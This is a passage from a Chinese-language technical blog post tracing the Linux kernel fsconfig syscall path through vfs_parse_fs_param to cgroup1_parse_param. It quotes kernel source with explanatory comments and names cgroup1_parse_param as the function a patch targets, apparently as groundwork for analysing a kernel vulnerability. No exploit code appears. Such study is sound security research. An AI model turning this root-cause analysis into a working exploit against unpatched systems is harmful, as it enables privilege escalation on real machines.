class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * sys_fsconfig - Set parameters and trigger actions on a context</span><br><span class="hljs-comment"> * @fd: The filesystem context to act upon</span><br><span class="hljs-comment"> * @cmd: The action to take</span><br><span class="hljs-comment"> * @_key: Where appropriate, the parameter key to set</span><br><span class="hljs-comment"> * @_value: Where appropriate, the parameter value to set</span><br><span class="hljs-comment"> * @aux: Additional information for the value</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This system call is used to set parameters on a context, including</span><br><span class="hljs-comment"> * superblock settings, data source and security labelling.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Actions include triggering the creation of a superblock and the</span><br><span class="hljs-comment"> * reconfiguration of the superblock attached to the specified context.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * When setting a parameter, @cmd indicates the type of value being proposed</span><br><span class="hljs-comment"> * and @_key indicates the parameter to be altered.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @_value and @aux are used to specify the value, should a value be required:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_flag: No value is specified.  The parameter must be boolean</span><br><span class="hljs-comment"> *     in nature.  The key may be prefixed with &quot;no&quot; to invert the</span><br><span class="hljs-comment"> *     setting. @_value must be NULL and @aux must be 0.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_string: A string value is specified.  The parameter can be</span><br><span class="hljs-comment"> *     expecting boolean, integer, string or take a path.  A conversion to an</span><br><span class="hljs-comment"> *     appropriate type will be attempted (which may include looking up as a</span><br><span class="hljs-comment"> *     path).  @_value points to a NUL-terminated string and @aux must be 0.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_binary: A binary blob is specified.  @_value points to the</span><br><span class="hljs-comment"> *     blob and @aux indicates its size.  The parameter must be expecting a</span><br><span class="hljs-comment"> *     blob.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_path: A non-empty path is specified.  The parameter must be</span><br><span class="hljs-comment"> *     expecting a path object.  @_value points to a NUL-terminated string that</span><br><span class="hljs-comment"> *     is the path and @aux is a file descriptor at which to start a relative</span><br><span class="hljs-comment"> *     lookup or AT_FDCWD.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_path_empty: As fsconfig_set_path, but with AT_EMPTY_PATH</span><br><span class="hljs-comment"> *     implied.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_fd: An open file descriptor is specified.  @_value must be</span><br><span class="hljs-comment"> *     NULL and @aux indicates the file descriptor.</span><br><span class="hljs-comment"> */</span><br>SYSCALL_DEFINE5(fsconfig,<br>		<span class="hljs-type">int</span>, fd,<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, cmd,<br>		<span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _key,<br>		<span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *, _value,<br>		<span class="hljs-type">int</span>, aux)<br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span>;</span><br>	<span class="hljs-type">int</span> ret;<br>	<span class="hljs-type">int</span> lookup_flags = <span class="hljs-number">0</span>;<br>	<span class="hljs-comment">//定义了一个struct fs_parameter param变量</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> <span class="hljs-title">param</span> =</span> &#123;<br>		.type	= fs_value_is_undefined,<br>	&#125;;<br><br>	<span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">return</span> -EINVAL;<br>	<span class="hljs-comment">//一堆switch</span><br>	<span class="hljs-keyword">switch</span> (cmd) &#123;<br>	<span class="hljs-keyword">case</span> FSCONFIG_SET_FLAG:<br>		<span class="hljs-keyword">if</span> (!_key || _value || aux)<br>			<span class="hljs-keyword">return</span> -EINVAL;<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br>		<span class="hljs-keyword">if</span> (!_key || !_value || aux)<br>			<span class="hljs-keyword">return</span> -EINVAL;<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> FSCONFIG_SET_BINARY:<br>		<span class="hljs-keyword">if</span> (!_key || !_value || aux &lt;= <span class="hljs-number">0</span> || aux &gt; <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>)<br>			<span class="hljs-keyword">return</span> -EINVAL;<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> FSCONFIG_SET_PATH:<br>	<span class="hljs-keyword">case</span> FSCONFIG_SET_PATH_EMPTY:<br>		<span class="hljs-keyword">if</span> (!_key || !_value || (aux != AT_FDCWD &amp;&amp; aux &lt; <span class="hljs-number">0</span>))<br>			<span class="hljs-keyword">return</span> -EINVAL;<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br>		<span class="hljs-keyword">if</span> (!_key || _value || aux &lt; <span class="hljs-number">0</span>)<br>			<span class="hljs-keyword">return</span> -EINVAL;<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> FSCONFIG_CMD_CREATE:<br>	<span class="hljs-keyword">case</span> FSCONFIG_CMD_RECONFIGURE:<br>		<span class="hljs-keyword">if</span> (_key || _value || aux)<br>			<span class="hljs-keyword">return</span> -EINVAL;<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">default</span>:<br>		<span class="hljs-keyword">return</span> -EOPNOTSUPP;<br>	&#125;<br><br>	f = fdget(fd);<br>	<span class="hljs-keyword">if</span> (!f.file)<br>		<span class="hljs-keyword">return</span> -EBADF;<br>	ret = -EINVAL;<br>    <span class="hljs-comment">//判断当前通过fd得到的文件实例的方法集是不是fscontext_fops</span><br>	<span class="hljs-keyword">if</span> (f.file-&gt;f_op != &amp;fscontext_fops)<br>		<span class="hljs-keyword">goto</span> out_f;<br><br>	fc = f.file-&gt;private_data;<br>	<span class="hljs-keyword">if</span> (fc-&gt;ops == &amp;legacy_fs_context_ops) &#123;<br>		<span class="hljs-keyword">switch</span> (cmd) &#123;<br>		<span class="hljs-keyword">case</span> FSCONFIG_SET_BINARY:<br>		<span class="hljs-keyword">case</span> FSCONFIG_SET_PATH:<br>		<span class="hljs-keyword">case</span> FSCONFIG_SET_PATH_EMPTY:<br>		<span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br>			ret = -EOPNOTSUPP;<br>			<span class="hljs-keyword">goto</span> out_f;<br>		&#125;<br>	&#125;<br>	<span class="hljs-comment">//把这个字符串赋值到param.key</span><br>	<span class="hljs-keyword">if</span> (_key) &#123;<br>		param.key = strndup_user(_key, <span class="hljs-number">256</span>);<br>		<span class="hljs-keyword">if</span> (IS_ERR(param.key)) &#123;<br>			ret = PTR_ERR(param.key);<br>			<span class="hljs-keyword">goto</span> out_f;<br>		&#125;<br>	&#125;<br>	<span class="hljs-comment">//根据不同的cmd，确定不同的操作</span><br>	<span class="hljs-keyword">switch</span> (cmd) &#123;<br>	<span class="hljs-keyword">case</span> FSCONFIG_SET_FLAG:<br>		param.type = fs_value_is_flag;<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br>		param.type = fs_value_is_string;<br>		param.<span class="hljs-built_in">string</span> = strndup_user(_value, <span class="hljs-number">256</span>);<br>		<span class="hljs-keyword">if</span> (IS_ERR(param.<span class="hljs-built_in">string</span>)) &#123;<br>			ret = PTR_ERR(param.<span class="hljs-built_in">string</span>);<br>			<span class="hljs-keyword">goto</span> out_key;<br>		&#125;<br>		param.size = <span class="hljs-built_in">strlen</span>(param.<span class="hljs-built_in">string</span>);<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> FSCONFIG_SET_BINARY:<br>		param.type = fs_value_is_blob;<br>		param.size = aux;<br>		param.blob = memdup_user_nul(_value, aux);<br>		<span class="hljs-keyword">if</span> (IS_ERR(param.blob)) &#123;<br>			ret = PTR_ERR(param.blob);<br>			<span class="hljs-keyword">goto</span> out_key;<br>		&#125;<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> FSCONFIG_SET_PATH_EMPTY:<br>		lookup_flags = LOOKUP_EMPTY;<br>		<span class="hljs-comment">/* fallthru */</span><br>	<span class="hljs-keyword">case</span> FSCONFIG_SET_PATH:<br>		param.type = fs_value_is_filename;<br>		param.name = getname_flags(_value, lookup_flags, <span class="hljs-literal">NULL</span>);<br>		<span class="hljs-keyword">if</span> (IS_ERR(param.name)) &#123;<br>			ret = PTR_ERR(param.name);<br>			<span class="hljs-keyword">goto</span> out_key;<br>		&#125;<br>		param.dirfd = aux;<br>		param.size = <span class="hljs-built_in">strlen</span>(param.name-&gt;name);<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br>		param.type = fs_value_is_file;<br>		ret = -EBADF;<br>		param.file = fget(aux);<br>		<span class="hljs-keyword">if</span> (!param.file)<br>			<span class="hljs-keyword">goto</span> out_key;<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">default</span>:<br>		<span class="hljs-keyword">break</span>;<br>	&#125;<br>	<span class="hljs-comment">//加锁</span><br>	ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);<br>	<span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>) &#123;<br>		ret = vfs_fsconfig_locked(fc, cmd, &amp;param);<span class="hljs-comment">//very important</span><br>		mutex_unlock(&amp;fc-&gt;uapi_mutex);<br>	&#125;<br><br>	<span class="hljs-comment">/* Clean up the our record of any value that we obtained from</span><br><span class="hljs-comment">	 * userspace.  Note that the value may have been stolen by the LSM or</span><br><span class="hljs-comment">	 * filesystem, in which case the value pointer will have been cleared.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">switch</span> (cmd) &#123;<br>	<span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br>	<span class="hljs-keyword">case</span> FSCONFIG_SET_BINARY:<br>		kfree(param.<span class="hljs-built_in">string</span>);<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> FSCONFIG_SET_PATH:<br>	<span class="hljs-keyword">case</span> FSCONFIG_SET_PATH_EMPTY:<br>		<span class="hljs-keyword">if</span> (param.name)<br>			putname(param.name);<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br>		<span class="hljs-keyword">if</span> (param.file)<br>			fput(param.file);<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">default</span>:<br>		<span class="hljs-keyword">break</span>;<br>	&#125;<br>out_key:<br>	kfree(param.key);<br>out_f:<br>	fdput(f);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>首先是一个结构体变量，这个变量将用于下面的一系列操作</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> <span class="hljs-title">param</span> =</span> &#123;<br>                .type   = fs_value_is_undefined,<br>        &#125;;<br></code></pre></td></tr></table></figure>
+
+<p>看一下<code>define</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> &#123;</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">char</span>              *key;           <span class="hljs-comment">/* Parameter name */</span><br>        <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_value_type</span>      <span class="hljs-title">type</span>:</span><span class="hljs-number">8</span>;         <span class="hljs-comment">/* The type of value here */</span><br>        <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>                <span class="hljs-type">char</span>            *<span class="hljs-built_in">string</span>;<br>                <span class="hljs-type">void</span>            *blob;<br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">filename</span> *<span class="hljs-title">name</span>;</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span>     *<span class="hljs-title">file</span>;</span><br>        &#125;;<br>        <span class="hljs-type">size_t</span>  size;<br>        <span class="hljs-type">int</span>     dirfd;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<h3 id="vfs-fsconfig-locked"><a href="#vfs-fsconfig-locked" class="headerlink" title="vfs_fsconfig_locked"></a><strong>vfs_fsconfig_locked</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Check the state and apply the configuration.  Note that this function is</span><br><span class="hljs-comment"> * allowed to &#x27;steal&#x27; the value by setting param-&gt;xxx to NULL before returning.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vfs_fsconfig_locked</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-type">int</span> cmd,</span><br><span class="hljs-params">			       <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">super_block</span> *<span class="hljs-title">sb</span>;</span><br>	<span class="hljs-type">int</span> ret;<br><br>	ret = finish_clean_context(fc);<br>	<span class="hljs-keyword">if</span> (ret)<br>		<span class="hljs-keyword">return</span> ret;<br>	<span class="hljs-keyword">switch</span> (cmd) &#123;<br>	<span class="hljs-keyword">case</span> FSCONFIG_CMD_CREATE:<br>            <span class="hljs-comment">//检查fc的阶段是否为FS_CONTEXT_CREATE_PARAMS</span><br>		<span class="hljs-keyword">if</span> (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS)<br>			<span class="hljs-keyword">return</span> -EBUSY;<br>            <span class="hljs-comment">//检查是否有创建文件系统的权限</span><br>		<span class="hljs-keyword">if</span> (!mount_capable(fc))<br>			<span class="hljs-keyword">return</span> -EPERM;<br>            <span class="hljs-comment">//设置fc的阶段为FS_CONTEXT_CREATING</span><br>		fc-&gt;phase = FS_CONTEXT_CREATING;<br>            <span class="hljs-comment">//获取文件树</span><br>		ret = vfs_get_tree(fc);<br>		<span class="hljs-keyword">if</span> (ret)<br>			<span class="hljs-keyword">break</span>;<br>		sb = fc-&gt;root-&gt;d_sb;<br>		ret = security_sb_kern_mount(sb);<br>		<span class="hljs-keyword">if</span> (unlikely(ret)) &#123;<br>			fc_drop_locked(fc);<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		up_write(&amp;sb-&gt;s_umount);<br>            <span class="hljs-comment">//将fc的阶段设置为FS_CONTEXT_AWAITING_MOUNT并返回成功</span><br>		fc-&gt;phase = FS_CONTEXT_AWAITING_MOUNT;<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">case</span> FSCONFIG_CMD_RECONFIGURE:<br>		<span class="hljs-keyword">if</span> (fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)<br>			<span class="hljs-keyword">return</span> -EBUSY;<br>		fc-&gt;phase = FS_CONTEXT_RECONFIGURING;<br>		sb = fc-&gt;root-&gt;d_sb;<br>		<span class="hljs-keyword">if</span> (!ns_capable(sb-&gt;s_user_ns, CAP_SYS_ADMIN)) &#123;<br>			ret = -EPERM;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		down_write(&amp;sb-&gt;s_umount);<br>		ret = reconfigure_super(fc);<br>		up_write(&amp;sb-&gt;s_umount);<br>		<span class="hljs-keyword">if</span> (ret)<br>			<span class="hljs-keyword">break</span>;<br>		vfs_clean_context(fc);<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">default</span>:<br>		<span class="hljs-keyword">if</span> (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS &amp;&amp;<br>		    fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)<br>			<span class="hljs-keyword">return</span> -EBUSY;<br>		<span class="hljs-comment">//默认执行此处</span><br>		<span class="hljs-keyword">return</span> vfs_parse_fs_param(fc, param);<br>	&#125;<br>	fc-&gt;phase = FS_CONTEXT_FAILED;<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="vfs-parse-fs-param"><a href="#vfs-parse-fs-param" class="headerlink" title="vfs_parse_fs_param"></a>vfs_parse_fs_param</h3><p>在此之前，我们完成了对<strong>param</strong>的赋值。现在要做的就是把<strong>param</strong>里的参数转到文件系统上下文里</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * vfs_parse_fs_param - Add a single parameter to a superblock config</span><br><span class="hljs-comment"> * @fc: The filesystem context to modify</span><br><span class="hljs-comment"> * @param: The parameter</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * A single mount option in string form is applied to the filesystem context</span><br><span class="hljs-comment"> * being set up.  Certain standard options (for example &quot;ro&quot;) are translated</span><br><span class="hljs-comment"> * into flag bits without going to the filesystem.  The active security module</span><br><span class="hljs-comment"> * is allowed to observe and poach options.  Any other options are passed over</span><br><span class="hljs-comment"> * to the filesystem to parse.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This may be called multiple times for a context.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns 0 on success and a negative error code on failure.  In the event of</span><br><span class="hljs-comment"> * failure, supplementary error information may have been set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">vfs_parse_fs_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br>	<span class="hljs-type">int</span> ret;<br><br>	<span class="hljs-keyword">if</span> (!param-&gt;key)<br>		<span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;Unnamed parameter\n&quot;</span>);<br><br>	ret = vfs_parse_sb_flag(fc, param-&gt;key);<br>	<span class="hljs-keyword">if</span> (ret != -ENOPARAM)<br>		<span class="hljs-keyword">return</span> ret;<br><br>	ret = security_fs_context_parse_param(fc, param);<br>	<span class="hljs-keyword">if</span> (ret != -ENOPARAM)<br>		<span class="hljs-comment">/* Param belongs to the LSM or is disallowed by the LSM; so</span><br><span class="hljs-comment">		 * don&#x27;t pass to the FS.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">return</span> ret;<br><br>	<span class="hljs-keyword">if</span> (fc-&gt;ops-&gt;parse_param) &#123;<br>		ret = fc-&gt;ops-&gt;parse_param(fc, param);<br>		<span class="hljs-keyword">if</span> (ret != -ENOPARAM)<br>			<span class="hljs-keyword">return</span> ret;<br>	&#125;<br><br>	<span class="hljs-comment">/* If the filesystem doesn&#x27;t take any arguments, give it the</span><br><span class="hljs-comment">	 * default handling of source.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, <span class="hljs-string">&quot;source&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>		<span class="hljs-keyword">if</span> (param-&gt;type != fs_value_is_string)<br>			<span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Non-string source&quot;</span>);<br>		<span class="hljs-keyword">if</span> (fc-&gt;source)<br>			<span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Multiple sources&quot;</span>);<br>		fc-&gt;source = param-&gt;<span class="hljs-built_in">string</span>;<br>		param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;%s: Unknown parameter &#x27;%s&#x27;&quot;</span>,<br>		      fc-&gt;fs_type-&gt;name, param-&gt;key);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其中最重要的一句是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ret = fc-&gt;ops-&gt;parse_param(fc, param);<br></code></pre></td></tr></table></figure>
+
+<p>很显然，这里是需要使用文件系统上下文中的<code>parse_param</code>方法，如果我们设置文件系统为<code>cgroup1</code></p>
+<p>则会调用到<code>cgroup1_parse_param</code></p>
+<h3 id="cgroup1-parse-param"><a href="#cgroup1-parse-param" class="headerlink" title="cgroup1_parse_param"></a>cgroup1_parse_param</h3><p>于此，我们终于来到了<code>patch</code>中的目标函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">cgroup1_parse_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cgroup_fs_context</span> *<span class="hljs-title">ctx</span> =</span> cgroup_fc2context(fc);<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cgroup_subsys</span> *<span class="hljs-title">ss</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parse_result</span> <span class="hljs-title">result</span>;</span><br>	<span class="hljs-type">int</span> opt, i;<br>	<span class="hljs-comment">//主要的挂载参数的解析函数</span><br>	opt = fs_parse(fc, cgroup1_fs_parameters, param, &amp;result);<br>	<span class="hljs-keyword">if</span> (opt == -ENOPARAM) &#123;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, <span class="hljs-string">&quot;source&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>			fc-&gt;source = param-&gt;<span class="hljs-built_in">string</span>;<br>			param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br>			<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>		&#125;<br>		for_each_subsys(ss, i) &#123;<br>			<span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, ss-&gt;legacy_name))<br>				<span class="hljs-keyword">continue</span>;<br>			ctx-&gt;subsys_mask |= (<span class="hljs-number">1</span> &lt;&lt; i);<br>			<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>		&#125;<br>		<span class="hljs-keyword">return</span> invalfc(fc, <span class="hljs-string">&quot;Unknown subsys name &#x27;%s&#x27;&quot;</span>, param-&gt;key);<br>	&#125;<br>	<span class="hljs-keyword">if</span> (opt &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">return</span> opt;<br><br>	<span class="hljs-keyword">switch</span> (opt) &#123;<br>	<span class="hljs-keyword">case</span> Opt_none:<br>		<span class="hljs-comment">/* Explicitly have no subsystems */</span><br>		ctx-&gt;none = <span class="hljs-literal">true</span>;<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> Opt_all:<br>		ctx-&gt;all_ss = <span class="hljs-literal">true</span>;<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> Opt_noprefix:<br>		ctx-&gt;flags |= CGRP_ROOT_NOPREFIX;<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> Opt_clone_children:<br>		ctx-&gt;cpuset_clone_children = <span class="hljs-literal">true</span>;<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> Opt_cpuset_v2_mode:<br>		ctx-&gt;flags |= CGRP_ROOT_CPUSET_V2_MODE;<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> Opt_xattr:<br>		ctx-&gt;flags |= CGRP_ROOT_XATTR;<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> Opt_release_agent:<br>		<span class="hljs-comment">/* Specifying two release agents is forbidden */</span><br>		<span class="hljs-keyword">if</span> (ctx-&gt;release_agent)<br>			<span class="hljs-keyword">return</span> invalfc(fc, <span class="hljs-string">&quot;release_agent respecified&quot;</span>);<br>		ctx-&gt;release_agent = param-&gt;<span class="hljs-built_in">string</span>;<br>		param-&gt;<span class="hljs-built_in">string</span> = <span 